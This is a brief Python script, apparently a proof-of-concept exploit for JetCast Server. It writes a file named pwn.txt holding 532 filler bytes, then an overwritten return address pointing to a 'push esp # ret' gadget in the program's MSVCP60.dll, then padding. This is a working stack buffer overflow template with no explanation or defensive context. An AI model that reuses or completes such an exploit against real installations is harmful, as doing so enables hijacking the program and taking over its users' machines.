#!/usr/bin/python

payload  = "A" * 532
payload += "\x4f\x5d\xee\x77"          # 0x77ee5d4f - # push esp # ret  - C:\Program Files\JetCast Server\MSVCP60.dll
payload += "C" * (5000 - len(payload))

f = open('pwn.txt', 'w')
f.write(payload)
f.close()

